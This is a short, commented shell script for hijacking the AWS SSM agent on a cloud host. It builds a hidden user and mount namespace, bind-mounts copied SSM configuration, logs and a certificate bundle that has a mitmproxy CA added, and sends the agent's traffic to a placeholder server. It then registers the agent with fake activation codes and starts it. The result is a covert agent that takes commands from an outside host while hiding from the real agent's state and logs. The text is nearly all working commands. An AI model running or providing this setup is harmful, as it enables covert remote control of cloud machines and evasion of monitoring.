mkdir /tmp/ssm_pg # A workdir where we place files we need
cd /tmp/ssm_pg
mkdir -p binds/varlib # A folder which will override /var/lib/amazon/ssm/ in the new namespace
mkdir -p binds/logs # A folder which will override /var/log/amazon/ssm in the new namespace
mkdir -p binds/conf # A folder which will override /etc/amazon/ssm in the new namespace
mkdir -p binds/certs # A folder which will override /etc/ssl/certs in the new namespace

cp -r /etc/amazon/ssm/* ./binds/conf/

# Copy some binaries to avoid orphan worker detection, which causes current execution to fail
cp `which ssm-agent-worker` .
cp `which ssm-session-worker` .

# Copy existing certificates
cp /etc/ssl/certs/* ./binds/certs/
chmod a+w ./binds/certs/ca-certificates.crt

# Add existing mitmproxy certificate - get it from the mitm server (/root/.mitmproxy/mitmproxy-ca-cert.cer).
# You'll note that this certificate works just when the server machine has public IP (AKA it's not behind NAT)
cat /tmp/mitmproxy-ca-cert.pem >> ./binds/certs/ca-certificates.crt
chmod a-w ./binds/certs/ca-certificates.crt

# unshare time - create a new user namespace, make ourselves root in it, and a new filesystem namespace
unshare -rm
mount --bind /tmp/ssm_pg/binds/varlib /var/lib/amazon/ssm # Bind over the existing VM
mount --bind /tmp/ssm_pg/binds/logs /var/log/amazon/ssm/ # Bind over log directory
mount --bind /tmp/ssm_pg/binds/conf /etc/amazon/ssm # Bind over configuration directory
mount --bind /tmp/ssm_pg/binds/certs /etc/ssl/certs # Bind over certificates directory

# Setup our mock server as proxy server
export http_proxy="https://<SERVER_IP>:5000"
export https_proxy="https://<SERVER_IP>:5000"
export no_proxy="169.254.169.254"

# Register for the new account - the code and id can be fake
export ACC_CODE="FAKE_ACTIVATION_CODE"
export ACC_ID="FAKE_ACTIVATION_ID1234567890123456789012"
export ACC_REGION="<REGION>"
amazon-ssm-agent -register -code "$ACC_CODE" -id "$ACC_ID" -region "$ACC_REGION"

# Launch ssm manager
amazon-ssm-agent &
